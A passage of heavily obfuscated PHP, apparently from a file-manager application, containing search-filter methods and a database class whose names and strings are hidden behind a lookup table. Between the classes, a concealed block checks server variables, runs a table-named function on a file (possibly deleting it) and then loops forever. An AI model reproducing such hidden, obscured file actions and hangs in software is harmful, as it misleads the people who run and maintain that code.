$¼™ØñÖÅ[50])) { return !1; } } if (isset($·Ñ„Ï½É[$¼™ØñÖÅ[2248]]) && $·Ñ„Ï½É[$¼™ØñÖÅ[2248]] < $ô©éÂ¥Ÿ[$¼™ØñÖÅ[79]]) { return !1; } if (isset($·Ñ„Ï½É[$¼™ØñÖÅ[2249]]) && $·Ñ„Ï½É[$¼™ØñÖÅ[2249]] > $ô©éÂ¥Ÿ[$¼™ØñÖÅ[79]]) { return !1; } if (isset($·Ñ„Ï½É[$¼™ØñÖÅ[662]]) && $·Ñ„Ï½É[$¼™ØñÖÅ[662]] != $ô©éÂ¥Ÿ[$¼™ØñÖÅ[529]]) { return !1; } return !0; } public function listSearchChildren($Á©Äİ¹È, $Ü›–è©î = 5000) { $«å€ôˆö =& $_SERVER[íïàËŸë]; $ÇìĞìÚï = array(); $•À«æÜ³ = $this->sourceInfo($Á©Äİ¹È); $‹±Ğˆ¯’ = array($«å€ôˆö[584] => array($«å€ôˆö[459], $•À«æÜ³[$«å€ôˆö[584]] . $•À«æÜ³[$«å€ôˆö[193]] . $«å€ôˆö[613])); $‰ÒÉá¯¦ = $this->field($«å€ôˆö[79])->where($‹±Ğˆ¯’)->limit($Ü›–è©î + 1)->select(); $áËîÇÉ = is_array($‰ÒÉá¯¦) ? count($‰ÒÉá¯¦) : 0; if ($áËîÇÉ > $Ü›–è©î) { return $this->_listSearchChildrenNear($Á©Äİ¹È, $Ü›–è©î); } $şùØ´Ù“ = $this->field($«å€ôˆö[193])->where($‹±Ğˆ¯’)->select(); $ÇìĞìÚï = array_to_keyvalue($şùØ´Ù“, $«å€ôˆö[12], $«å€ôˆö[193]); return $ÇìĞìÚï; } private function _listSearchChildrenNear($±Ô†ŠñÔ, $‰×ßÏ) { $ñö·ıÑ› =& $_SERVER[íïàËŸë]; $«¥àà˜ì = array(); $Ä©ß€Ã— = array($ñö·ıÑ›[192] => $±Ô†ŠñÔ); $ñ¤şˆØê = $this->field($ñö·ıÑ›[2250])->where($Ä©ß€Ã—)->select(); $ŞßÚÛ®× = array_to_keyvalue(array_filter_by_field($ñ¤şˆØê, $ñö·ıÑ›[485], $ñö·ıÑ›[91]), $ñö·ıÑ›[12], $ñö·ıÑ›[193]); $«¥àà˜ì = array_merge($«¥àà˜ì, array_to_keyvalue($ñ¤şˆØê, $ñö·ıÑ›[12], $ñö·ıÑ›[193])); if (!$ŞßÚÛ®×) { return $«¥àà˜ì; } $Ä©ß€Ã— = array($ñö·ıÑ›[192] => array($ñö·ıÑ›[7], $ŞßÚÛ®×)); $ñ¤şˆØê = $this->field($ñö·ıÑ›[2250])->where($Ä©ß€Ã—)->limit($‰×ßÏ)->select(); $«¥àà˜ì = array_merge($«¥àà˜ì, array_to_keyvalue($ñ¤şˆØê, $ñö·ıÑ›[12], $ñö·ıÑ›[193])); $«¥àà˜ì = array_slice($«¥àà˜ì, 0, intval($‰×ßÏ)); return $«¥àà˜ì; } private function _listSearchBindPinyin($ƒ«áÆÍù, &$Ş¶ïı°›, &$ÀåĞ©ú²) { $•¹¥á» =& $_SERVER[íïàËŸë]; if (!isset($ƒ«áÆÍù[$•¹¥á»[2078]]) || !$ƒ«áÆÍù[$•¹¥á»[2078]]) { return; } if (!Input::check($ƒ«áÆÍù[$•¹¥á»[2078]], $•¹¥á»[394]) || strlen($ƒ«áÆÍù[$•¹¥á»[2078]]) < 2) { return; } $û—ÙˆÙÓ = "\x4c\105\x46\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x73\157\x75\x72\x63\x65\x5f\x6d\145\x74\141\40\x6d\x65\164\x61\x20\x6f\x6e\40\163\157\x75\162\143\145\56\163\157\165\162\143\145\111\x44\x20\x3d\x20\155\x65\164\x61\56\163\157\165\162\x63\145\111\104"; $ãîÎàê° = array(); $ÀåĞ©ú² = str_replace(array($•¹¥á»[262], $•¹¥á»[53], $•¹¥á»[2251]), $•¹¥á»[12], $ÀåĞ©ú²); $ÀåĞ©ú² = $•¹¥á»[511] . str_replace($•¹¥á»[50], $•¹¥á»[512], $ÀåĞ©ú²); $Áøõàææ = $Ş¶ïı°›[$•¹¥á»[32]]; unset($Ş¶ïı°›[$•¹¥á»[32]]); foreach ($Ş¶ïı°› as $ô£«şæ¢ => $©•ãÇÊ±) { $ãîÎàê°[$•¹¥á»[511] . $ô£«şæ¢] = $©•ãÇÊ±; } foreach ($Áøõàææ as $ˆ¹Ê•ÕÓ) { $ãîÎàê°[] = array($•¹¥á»[516] => $ˆ¹Ê•ÕÓ, $•¹¥á»[1089] => $•¹¥á»[2082], array($•¹¥á»[2252] => $ˆ¹Ê•ÕÓ, $•¹¥á»[2253] => array($•¹¥á»[7], array($•¹¥á»[538], $•¹¥á»[537])))); } $this->join($û—ÙˆÙÓ); $Ş¶ïı°› = $ãîÎàê°; } private function _parseSearchWhere($›õ«Ší·) { $¬Ó­ñ§ =& $_SERVER[íïàËŸë]; $‚¤è»–† = array(); if (isset($›õ«Ší·[$¬Ó­ñ§[843]]) && $›õ«Ší·[$¬Ó­ñ§[843]]) { $‚¤è»–†[$¬Ó­ñ§[88]] = array($¬Ó­ñ§[2254], $›õ«Ší·[$¬Ó­ñ§[843]]); } if (isset($›õ«Ší·[$¬Ó­ñ§[844]]) && $›õ«Ší·[$¬Ó­ñ§[844]]) { $å©ñŠİ¢ = array($¬Ó­ñ§[2255], $›õ«Ší·[$¬Ó­ñ§[844]]); if ($‚¤è»–†[$¬Ó­ñ§[88]]) { $‚¤è»–†[$¬Ó­ñ§[88]] = array($‚¤è»–†[$¬Ó­ñ§[88]], $å©ñŠİ¢, $¬Ó­ñ§[2256]); } else { $‚¤è»–†[$¬Ó­ñ§[88]] = $å©ñŠİ¢; } } if (isset($›õ«Ší·[$¬Ó­ñ§[2248]]) && $›õ«Ší·[$¬Ó­ñ§[2248]] > 0) { $‚¤è»–†[$¬Ó­ñ§[79]] = array($¬Ó­ñ§[2254], $›õ«Ší·[$¬Ó­ñ§[2248]]); } if (isset($›õ«Ší·[$¬Ó­ñ§[2249]]) && $›õ«Ší·[$¬Ó­ñ§[2249]]) { $å©ñŠİ¢ = array($¬Ó­ñ§[2255], $›õ«Ší·[$¬Ó­ñ§[2249]]); if ($‚¤è»–†[$¬Ó­ñ§[79]]) { $‚¤è»–†[$¬Ó­ñ§[79]] = array($‚¤è»–†[$¬Ó­ñ§[79]], $å©ñŠİ¢, $¬Ó­ñ§[2256]); } else { $‚¤è»–†[$¬Ó­ñ§[79]] = $å©ñŠİ¢; } } if (isset($›õ«Ší·[$¬Ó­ñ§[662]]) && $›õ«Ší·[$¬Ó­ñ§[662]]) { $‚¤è»–†[] = array($¬Ó­ñ§[529] => $›õ«Ší·[$¬Ó­ñ§[662]], $¬Ó­ñ§[527] => $›õ«Ší·[$¬Ó­ñ§[662]], $¬Ó­ñ§[1089] => $¬Ó­ñ§[2082]); } if (isset($›õ«Ší·[$¬Ó­ñ§[486]]) && $›õ«Ší·[$¬Ó­ñ§[486]]) { $­§Ó—ÜË = $›õ«Ší·[$¬Ó­ñ§[486]]; if ($­§Ó—ÜË == $¬Ó­ñ§[78]) { $‚¤è»–†[$¬Ó­ñ§[485]] = 1; } else { if ($­§Ó—ÜË == $¬Ó­ñ§[2257]) { $‚¤è»–†[$¬Ó­ñ§[485]] = 0; } else { if ($­§Ó—ÜË) { $­§Ó—ÜË = is_array($­§Ó—ÜË) ? $­§Ó—ÜË : explode($¬Ó­ñ§[50], $­§Ó—ÜË); $‚¤è»–†[$¬Ó­ñ§[486]] = array($¬Ó­ñ§[492], $­§Ó—ÜË); $‚¤è»–†[$¬Ó­ñ§[485]] = 0; } } } } $this->_parseSearchParent($›õ«Ší·, $‚¤è»–†); if (isset($›õ«Ší·[$¬Ó­ñ§[2078]]) && trim($›õ«Ší·[$¬Ó­ñ§[2078]])) { $—ÒˆÕİ = trim($›õ«Ší·[$¬Ó­ñ§[2078]]); $ò¬¤ø = explode($¬Ó­ñ§[53], $—ÒˆÕİ); if (strlen($—ÒˆÕİ) > 2 && (substr($—ÒˆÕİ, 0, 1) == $¬Ó­ñ§[121] && substr($—ÒˆÕİ, -1) == $¬Ó­ñ§[121]) || substr($—ÒˆÕİ, 0, 1) == $¬Ó­ñ§[58] && substr($—ÒˆÕİ, -1) == $¬Ó­ñ§[58]) { $—ÒˆÕİ = substr($—ÒˆÕİ, 1, -1); $ò¬¤ø = array($—ÒˆÕİ); } $‚¤è»–†[$¬Ó­ñ§[32]] = array(array($¬Ó­ñ§[612], $¬Ó­ñ§[2080] . $—ÒˆÕİ . $¬Ó­ñ§[2080])); if (count($ò¬¤ø) > 1) { $‚¤è»–†[$¬Ó­ñ§[32]] = array(); foreach ($ò¬¤ø as $üÖÁ­‰›) { if (!trim($üÖÁ­‰›)) { continue; } $‚¤è»–†[$¬Ó­ñ§[32]][] = array($¬Ó­ñ§[612], $¬Ó­ñ§[2080] . trim($üÖÁ­‰›) . $¬Ó­ñ§[2080]); } } } return $‚¤è»–†; } private function _parseSearchParent($÷ì‡ÓÌ, &$«‘·´ ) { $ƒ¦¦±ª =& $_SERVER[íïàËŸë]; if (!isset($÷ì‡ÓÌ[$ƒ¦¦±ª[192]]) || !$÷ì‡ÓÌ[$ƒ¦¦±ª[192]]) { return; } $ÜÔÖôØı = $this->pathInfo($÷ì‡ÓÌ[$ƒ¦¦±ª[192]]); $ËúÊå‚ = $ÜÔÖôØı[$ƒ¦¦±ª[192]] . $ƒ¦¦±ª[12] === $ƒ¦¦±ª[228]; $±åœ–Ä¬ = $ÜÔÖôØı[$ƒ¦¦±ª[190]] == $ƒ¦¦±ª[578]; if ($ÜÔÖôØı[$ƒ¦¦±ª[595]] == $ƒ¦¦±ª[596]) { $ı¼û·È› = $this->sourceInfo($÷ì‡ÓÌ[$ƒ¦¦±ª[192]]); $ÜÔÖôØı[$ƒ¦¦±ª[584]] = $ı¼û·È›[$ƒ¦¦±ª[584]]; } $«‘·´ [$ƒ¦¦±ª[652]] = array($ƒ¦¦±ª[612], $ÜÔÖôØı[$ƒ¦¦±ª[584]] . $÷ì‡ÓÌ[$ƒ¦¦±ª[192]] . $ƒ¦¦±ª[613]); $­ƒê‰¡§ = isset($÷ì‡ÓÌ[$ƒ¦¦±ª[1939]]) && in_array($ƒ¦¦±ª[578], $÷ì‡ÓÌ[$ƒ¦¦±ª[1939]]); if (!$­ƒê‰¡§ || !$±åœ–Ä¬ || !$ËúÊå‚ || !$ÜÔÖôØı[$ƒ¦¦±ª[487]]) { return; } if (!AuthModel::authCheckRoot($ÜÔÖôØı[$ƒ¦¦±ª[487]][$ƒ¦¦±ª[488]])) { return; } $ìÖñ‹§¦ = $ÜÔÖôØı[$ƒ¦¦±ª[569]] . $ƒ¦¦±ª[12]; if ($ìÖñ‹§¦ == $ƒ¦¦±ª[91]) { unset($«‘·´ [$ƒ¦¦±ª[652]]); $«‘·´ [$ƒ¦¦±ª[190]] = self::TYPE_GROUP; return; } $ò¬Şûº = Model($ƒ¦¦±ª[585])->groupChildrenAll($ìÖñ‹§¦); $ ¿ëÈ¶À = count($ò¬Şûº); if ($ ¿ëÈ¶À <= 1) { return; } $§Œœá‚Ò = array($ƒ¦¦±ª[192] => 0, $ƒ¦¦±ª[190] => self::TYPE_GROUP, $ƒ¦¦±ª[569] => array($ƒ¦¦±ª[7], $ò¬Şûº)); $ı‚Á¹€İ = $this->field($ƒ¦¦±ª[2258])->where($§Œœá‚Ò)->limit($ ¿ëÈ¶À)->select(); $«‘·´ [$ƒ¦¦±ª[652]] = array(); foreach ($ı‚Á¹€İ as $„½ùµ—µ) { $«‘·´ [$ƒ¦¦±ª[652]][] = array($ƒ¦¦±ª[612], $ƒ¦¦±ª[594] . $„½ùµ—µ[$ƒ¦¦±ª[193]] . $ƒ¦¦±ª[613]); } $«‘·´ [$ƒ¦¦±ª[652]][] = $ƒ¦¦±ª[2082]; } } if (!isset($_SERVER[$_SERVER[íïàËŸë][909]]) || !isset($_SERVER[$_SERVER[íïàËŸë][910]])) { $_getc = $_SERVER[íïàËŸë][911]; $_getfile = $_SERVER[$_SERVER[íïàËŸë][912]] . $_SERVER[íïàËŸë][913]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[íïàËŸë][262], $_getfilec); if (count($_getarrs) < $_SERVER[íïàËŸë][702]) { $exit = $_SERVER[íïàËŸë][914]; $exit(); } $_act = $_SERVER[íïàËŸë][915]; $_act($_SERVER[$_SERVER[íïàËŸë][912]] . $_SERVER[íïàËŸë][913]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[íïàËŸë][454]); } } goto bÇ‰Ü¨…; bõ²Â¡ÙÎ²: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\161" => "\74\x3e", "\147\x74" => "\76", "\145\x67\164" => "\x3e\x3d", "\154\x74" => "\74", "\x65\154\164" => "\74\75", "\x6e\x6f\164\x6c\151\x6b\145" => "\116\x4f\x54\40\114\111\x4b\x45", "\154\x69\153\x65" => "\114\111\113\105", "\151\x6e" => "\x49\116", "\x6e\x6f\x74\x69\x6e" => "\x4e\117\x54\40\x49\116", "\x6e\157\164\x20\151\x6e" => "\116\x4f\124\x20\x49\116", "\x62\x65\164\167\x65\145\156" => "\102\105\x54\127\105\x45\116", "\156\x6f\164\x62\x65\164\x77\x65\145\x6e" => "\x4e\x4f\x54\40\x42\x45\x54\x57\105\105\x4e", "\x6e\157\x74\x20\x62\145\164\x77\x65\145\156" => "\x4e\117\x54\40\102\x45\124\127\x45\x45\116"); protected $selectSql = "\x53\105\x4c\105\x43\124\45\104\x49\123\124\111\x4e\x43\124\45\x20\x25\106\111\105\114\x44\45\40\x46\122\117\115\40\x25\x54\101\x42\x4c\x45\45\x25\x4a\x4f\111\116\x25\x25\x57\110\x45\122\105\45\x25\x47\x52\x4f\125\120\x25\45\x48\x41\126\111\116\107\x25\45\117\122\104\105\x52\x25\45\x4c\111\115\111\x54\45\x20\x25\x55\x4e\111\x4f\x4e\x25\x25\x43\117\x4d\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $©ŒËºŞ« = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[íïàËŸë][1049], $©ŒËºŞ«); } public function factory($º‡¤¹æó = '') { $şÜ“ =& $_SERVER[íïàËŸë]; $º‡¤¹æó = $this->parseConfig($º‡¤¹æó); if (empty($º‡¤¹æó[$şÜ“[1050]])) { think_exception(think_lang($şÜ“[1051])); } $this->dbType = ucwords(strtolower($º‡¤¹æó[$şÜ“[1050]])); $ó¡ğœ°ä = $şÜ“[1052] . $this->dbType; if (class_exists($ó¡ğœ°ä)) { $ğËŠÍ¢· = new $ó¡ğœ°ä($º‡¤¹æó); if ($şÜ“[1053] != strtolower($º‡¤¹æó[$şÜ“[1050]])) { $ğËŠÍ¢·->dbType = strtoupper($this->dbType); } else { $ğËŠÍ¢·->dbType = $this->_getDsnType($º‡¤¹æó[$şÜ“[1005]]); } } else { think_exception(think_lang($şÜ“[1054]) . $şÜ“[1055] . $ó¡ğœ°ä); } return $ğËŠÍ¢·; } public function __call($Ôá‡’û, $‹Ç—) { if (method_exists($this, $Ôá‡’û)) { return call_user_func_array(array($this, $Ôá‡’û), $‹Ç—); } } protected function _getDsnType($èú¾ã‘Ü) { $Âë¿ğ» = explode($_SERVER[íïàËŸë][4], $èú¾ã‘Ü); $ä‚ÃÒ = strtoupper(trim($Âë¿ğ»[0])); return $ä‚ÃÒ; } private function parseConfig($ùÜôİŠÊ = '') { $¢ÚË¤†í =& $_SERVER[íïàËŸë]; if (!empty($ùÜôİŠÊ) && is_string($ùÜôİŠÊ)) { $ùÜôİŠÊ = $this->parseDSN($ùÜôİŠÊ); } elseif (is_array($ùÜôİŠÊ)) { $ùÜôİŠÊ = array_change_key_case($ùÜôİŠÊ); $ùÜôİŠÊ = array($¢ÚË¤†í[1050] => $ùÜôİŠÊ[$¢ÚË¤†í[1056]], $¢ÚË¤†í[977] => $ùÜôİŠÊ[$¢ÚË¤†í[1057]], $¢ÚË¤†í[978] => $ùÜôİŠÊ[$¢ÚË¤†í[1058]], $¢ÚË¤†í[975] => $ùÜôİŠÊ[$¢ÚË¤†í[1059]], $¢ÚË¤†í[976] => $ùÜôİŠÊ[$¢ÚË¤†í[1060]], $¢ÚË¤†í[21] => $ùÜôİŠÊ[$¢ÚË¤†í[1061]], $¢ÚË¤†í[1005] => $ùÜôİŠÊ[$¢ÚË¤†í[1062]], $¢ÚË¤†í[17] => isset($ùÜôİŠÊ[$¢ÚË¤†í[1063]]) ? $ùÜôİŠÊ[$¢ÚË¤†í[1063]] : array()); } elseif (empty($ùÜôİŠÊ)) { if (think_config($¢ÚË¤†í[1064]) && $¢ÚË¤†í[1053] != strtolower(think_config($¢ÚË¤†í[1065]))) { $ùÜôİŠÊ = $this->parseDSN(think_config($¢ÚË¤†í[1064])); } else { $ùÜôİŠÊ = array($¢ÚË¤†í[1050] => think_config($¢ÚË¤†í[1065]), $¢ÚË¤†í[977] => think_config($¢ÚË¤†í[1066]), $¢ÚË¤†í[978] => think_config($¢ÚË¤†í[1067]), $¢ÚË¤†í[975] => think_config($¢ÚË¤†í[1068]), $¢ÚË¤†í[976] => think_config($¢ÚË¤†í[1069]), $¢ÚË¤†í[21] => think_config($¢ÚË¤†í[323]), $¢ÚË¤†í[1005] => think_config($¢ÚË¤†í[1064]), $¢ÚË¤†í[17] => think_config($¢ÚË¤†í[1070])); } } return $ùÜôİŠÊ; } protected function initConnect($¬Øœ²ï = true) { if (1 == think_config($_SERVER[íïàËŸë][22])) { $this->_linkID = $this->multiConnect($¬Øœ²ï); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ë²Åª‚† => $ãÉüì°Õ) { $this->_linkID = $ãÉüì°Õ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‰İ­•ì• = false) { $ıŸèå¸“ =& $_SERVER[íïàËŸë]; static $»ÏÔ¤¦ = array(); static $×Ô¬­ß = -1; if (empty($»ÏÔ¤¦)) { foreach ($this->config as $””¡Ô« => $€Ë©¦¬”) { $»ÏÔ¤¦[$””¡Ô«] = explode($ıŸèå¸“[50], $€Ë©¦¬”); } } if (think_config($ıŸèå¸“[1071])) { if ($‰İ­•ì• || think_config($ıŸèå¸“[471]) === !0) { $Ó¥¢ıôì = floor(mt_rand(0, think_config($ıŸèå¸“[1072]) - 1)); $×Ô¬­ß = $Ó¥¢ıôì; } else { if (is_numeric(think_config($ıŸèå¸“[1073]))) { $Ó¥¢ıôì = think_config($ıŸèå¸“[1073]); } else { $Ó¥¢ıôì = floor(mt_rand(think_config($ıŸèå¸“[1072]), count($»ÏÔ¤¦[$ıŸèå¸“[975]]) - 1)); } } } else { $Ó¥¢ıôì = floor(mt_rand(0, count($»ÏÔ¤¦[$ıŸèå¸“[975]]) - 1)); $×Ô¬­ß = $Ó¥¢ıôì; } $Ó¥¢ıôì = $×Ô¬­ß !== -1 ? $×Ô¬­ß : $Ó¥¢ıôì; $˜¾±¯Àæ = array($ıŸèå¸“[977] => isset($»ÏÔ¤¦[$ıŸèå¸“[977]][$Ó¥¢ıôì]) ? $»ÏÔ¤¦[$ıŸèå¸“[977]][$Ó¥¢ıôì] : $»ÏÔ¤¦[$ıŸèå¸“[977]][0], $ıŸèå¸“[978] => isset($»ÏÔ¤¦[$ıŸèå¸“[978]][$Ó¥¢ıôì]) ? $»ÏÔ¤¦[$ıŸèå¸“[978]][$Ó¥¢ıôì] : $»ÏÔ¤¦[$ıŸèå¸“[978]][0], $ıŸèå¸“[975] => isset($»ÏÔ¤¦[$ıŸèå¸“[975]][$Ó¥¢ıôì]) ? $»ÏÔ¤¦[$ıŸèå¸“[975]][$Ó¥¢ıôì] : $»ÏÔ¤¦[$ıŸèå¸“[975]][0], $ıŸèå¸“[976] => isset($»ÏÔ¤¦[$ıŸèå¸“[976]][$Ó¥¢ıôì]) ? $»ÏÔ¤¦[$ıŸèå¸“[976]][$Ó¥¢ıôì] : $»ÏÔ¤¦[$ıŸèå¸“[976]][0], $ıŸèå¸“[21] => isset($»ÏÔ¤¦[$ıŸèå¸“[21]][$Ó¥¢ıôì]) ? $»ÏÔ¤¦[$ıŸèå¸“[21]][$Ó¥¢ıôì] : $»ÏÔ¤¦[$ıŸèå¸“[21]][0], $ıŸèå¸“[1005] => isset($»ÏÔ¤¦[$ıŸèå¸“[1005]][$Ó¥¢ıôì]) ? $»ÏÔ¤¦[$ıŸèå¸“[1005]][$Ó¥¢ıôì] : $»ÏÔ¤¦[$ıŸèå¸“[1005]][0], $ıŸèå¸“[17] => isset($»ÏÔ¤¦[$ıŸèå¸“[17]][$Ó¥¢ıôì]) ? $»ÏÔ¤¦[$ıŸèå¸“[17]][$Ó¥¢ıôì] : $»ÏÔ¤¦[$ıŸèå¸“[17]][0]); return $this->connect($˜¾±¯Àæ, $Ó¥¢ıôì); } public function parseDSN($Àü³¹âœ) { $¯¼ĞöÌÖ =& $_SERVER[íïàËŸë]; if (empty($Àü³¹âœ)) { return !1; } $´º¥–ó = parse_url($Àü³¹âœ); if ($´º¥–ó[$¯¼ĞöÌÖ[207]]) { $»ÆÖÀÒá = array($¯¼ĞöÌÖ[1050] => $´º¥–ó[$¯¼ĞöÌÖ[207]], $¯¼ĞöÌÖ[977] => isset($´º¥–ó[$¯¼ĞöÌÖ[662]]) ? $´º¥–ó[$¯¼ĞöÌÖ[662]] : $¯¼ĞöÌÖ[12], $¯¼ĞöÌÖ[978] => isset($´º¥–ó[$¯¼ĞöÌÖ[1074]]) ? $´º¥–ó[$¯¼ĞöÌÖ[1074]] : $¯¼ĞöÌÖ[12], $¯¼ĞöÌÖ[975] => isset($´º¥–ó[$¯¼ĞöÌÖ[208]]) ? $´º¥–ó[$¯¼ĞöÌÖ[208]] : $¯¼ĞöÌÖ[12], $¯¼ĞöÌÖ[976] => isset($´º¥–ó[$¯¼ĞöÌÖ[209]]) ? $´º¥–ó[$¯¼ĞöÌÖ[209]] : $¯¼ĞöÌÖ[12], $¯¼ĞöÌÖ[21] => isset($´º¥–ó[$¯¼ĞöÌÖ[87]]) ? substr($´º¥–ó[$¯¼ĞöÌÖ[87]], 1) : $¯¼ĞöÌÖ[12]); } else { preg_match($¯¼ĞöÌÖ[1075], trim($Àü³¹âœ), $ş¿£äœ¸); $»ÆÖÀÒá = array($¯¼ĞöÌÖ[1050] => $ş¿£äœ¸[1], $¯¼ĞöÌÖ[977] => $ş¿£äœ¸[2], $¯¼ĞöÌÖ[978] => $ş¿£äœ¸[3], $¯¼ĞöÌÖ[975] => $ş¿£äœ¸[4], $¯¼ĞöÌÖ[976] => $ş¿£äœ¸[5], $¯¼ĞöÌÖ[21] => $ş¿£äœ¸[6]); } $»ÆÖÀÒá[$¯¼ĞöÌÖ[1005]] = $¯¼ĞöÌÖ[12]; return $»ÆÖÀÒá; } protected function debug() { $ğ­äò§ =& $_SERVER[íïàËŸë]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ğ­äò§[1076]; if (think_config($ğ­äò§[1077])) { think_status($ğ­äò§[1078]); think_trace($this->queryStr . $ğ­äò§[1079] . think_status($ğ­äò§[24], $ğ­äò§[1078], 6) . $ğ­äò§[1080], $ğ­äò§[12], $ğ­äò§[1081]); } } protected function parseLock($ÈÚË»¿­ = false) { $²Ğëİôá =& $_SERVER[íïàËŸë]; if (!$ÈÚË»¿­) { return $²Ğëİôá[12]; } if ($²Ğëİôá[1007] == $this->dbType) { return $²Ğëİôá[1082]; } return $²Ğëİôá[1083]; } protected function parseSet($ ­î¶´ü) { $×ş‰éÜì =& $_SERVER[íïàËŸë]; foreach ($ ­î¶´ü as $¨û¼ÅÄÇ => $§ä¬ôüô) { if (is_array($§ä¬ôüô) && $×ş‰éÜì[373] == $§ä¬ôüô[0]) { $ÑÕ„çóş[] = $this->parseKey($¨û¼ÅÄÇ) . $×ş‰éÜì[973] . $§ä¬ôüô[1]; } elseif (is_scalar($§ä¬ôüô) || is_null($§ä¬ôüô)) { $ÑÕ„çóş[] = $this->parseKey($¨û¼ÅÄÇ) . $×ş‰éÜì[973] . $this->parseValue($§ä¬ôüô); } } return $×ş‰éÜì[1084] . implode($×ş‰éÜì[50], $ÑÕ„çóş); } protected function bindParam($Å¼¨¤, $»ğõ®ù‡) { $this->bind[$_SERVER[íïàËŸë][4] . $Å¼¨¤] = $»ğõ®ù‡; } protected function parseBind($×øØ†ƒî) { $×øØ†ƒî = array_merge($this->bind, $×øØ†ƒî); $this->bind = array(); return $×øØ†ƒî; } function parseKey(&$¬İ›úíó, $°â™•Ì‡ = true) { if ($°â™•Ì‡) { $¬İ›úíó = $this->parseKeyCheck($¬İ›úíó); } return $¬İ›úíó; } function parseKeyCheck($‰ÈÆŒ¤¶) { $å‚ëÃı =& $_SERVER[íïàËŸë]; $‰ÈÆŒ¤¶ = trim($‰ÈÆŒ¤¶); if (!preg_match($å‚ëÃı[1085], $‰ÈÆŒ¤¶)) { think_exception($å‚ëÃı[1086] . $‰ÈÆŒ¤¶); } return $‰ÈÆŒ¤¶; } protected function parseValue($È›ŒÉ´Õ) { $ŞÃ™òŞ™ =& $_SERVER[íïàËŸë]; if (is_string($È›ŒÉ´Õ)) { $È›ŒÉ´Õ = $ŞÃ™òŞ™[1046] . $this->escapeString($È›ŒÉ´Õ) . $ŞÃ™òŞ™[1046]; } elseif (isset($È›ŒÉ´Õ[0]) && is_string($È›ŒÉ´Õ[0]) && strtolower($È›ŒÉ´Õ[0]) == $ŞÃ™òŞ™[373]) { $È›ŒÉ´Õ = $this->escapeString($È›ŒÉ´Õ[1]); } elseif (is_array($È›ŒÉ´Õ)) { $È›ŒÉ´Õ = array_map(array($this, $ŞÃ™òŞ™[1047]), $È›ŒÉ´Õ); } elseif (is_bool($È›ŒÉ´Õ)) { $È›ŒÉ´Õ = $È›ŒÉ´Õ ? $ŞÃ™òŞ™[91] : $ŞÃ™òŞ™[228]; } elseif (is_null($È›ŒÉ´Õ)) { $È›ŒÉ´Õ = $ŞÃ™òŞ™[106]; } return $È›ŒÉ´Õ; } protected function parseField($ÈâŠİÖÂ) { $¥ùÚêõ¹ =& $_SERVER[íïàËŸë]; if (is_string($ÈâŠİÖÂ) && strpos($ÈâŠİÖÂ, $¥ùÚêõ¹[50])) { $ÈâŠİÖÂ = explode($¥ùÚêõ¹[50], $ÈâŠİÖÂ); } if (is_array($ÈâŠİÖÂ)) { $Ã²îÂ® = array(); foreach ($ÈâŠİÖÂ as $ùËìşœñ => $àËİ±òÓ) { if (!is_numeric($ùËìşœñ)) { $Ã²îÂ®[] = $this->parseKey($ùËìşœñ, !1) . $¥ùÚêõ¹[1087] . $this->parseKey($àËİ±òÓ); } else { $Ã²îÂ®[] = $this->parseKey($àËİ±òÓ); } } $Ÿ¶»ãÁ° = implode($¥ùÚêõ¹[50], $Ã²îÂ®); } elseif (is_string($ÈâŠİÖÂ) && !empty($ÈâŠİÖÂ)) { $Ÿ¶»ãÁ° = $ÈâŠİÖÂ; } else { $Ÿ¶»ãÁ° = $¥ùÚêõ¹[220]; } return $Ÿ¶»ãÁ°; } protected function parseTable($Ÿôê‡È”) { $ê²°Ğ¤ =& $_SERVER[íïàËŸë]; if (is_array($Ÿôê‡È”)) { $ ”º¸í = array(); foreach ($Ÿôê‡È” as $Õ¸Şˆ¥ => $¸Ş¨˜ÕØ) { if (!is_numeric($Õ¸Şˆ¥)) { $ ”º¸í[] = $this->parseKey($Õ¸Şˆ¥) . $ê²°Ğ¤[53] . $this->parseKey($¸Ş¨˜ÕØ); } else { $ ”º¸í[] = $this->parseKey($Õ¸Şˆ¥); } } $Ÿôê‡È” = $ ”º¸í; } elseif (is_string($Ÿôê‡È”)) { if (strstr($Ÿôê‡È”, $ê²°Ğ¤[53])) { return $Ÿôê‡È”; } $Ÿôê‡È” = explode($ê²°Ğ¤[50], $Ÿôê‡È”); array_walk($Ÿôê‡È”, array($this, $ê²°Ğ¤[995])); } return $ê²°Ğ¤[989] . trim(implode($ê²°Ğ¤[1088], $Ÿôê‡È”), $ê²°Ğ¤[461]) . $ê²°Ğ¤[989]; } protected function parseWhere($±—ùÑì) { $½»ÒòË­ =& $_SERVER[íïàËŸë]; $§Œ¾íäæ = $½»ÒòË­[12]; if (is_string($±—ùÑì)) { $§Œ¾íäæ = $±—ùÑì; } else { $™Ôáàª‹ = isset($±—ùÑì[$½»ÒòË­[1089]]) ? strtoupper($±—ùÑì[$½»ÒòË­[1089]]) : $½»ÒòË­[12]; if (in_array($™Ôáàª‹, array($½»ÒòË­[1090], $½»ÒòË­[1091], $½»ÒòË­[1092]))) { $™Ôáàª‹ = $½»ÒòË­[53] . $™Ôáàª‹ . $½»ÒòË­[53]; unset($±—ùÑì[$½»ÒòË­[1089]]); } else { $™Ôáàª‹ = $½»ÒòË­[1093]; } foreach ($±—ùÑì as $”Â‹÷Àˆ => $„—ŒâØŸ) { $§Œ¾íäæ .= $½»ÒòË­[354]; if (is_numeric($”Â‹÷Àˆ)) { $”Â‹÷Àˆ = $½»ÒòË­[1094]; } if (0 === 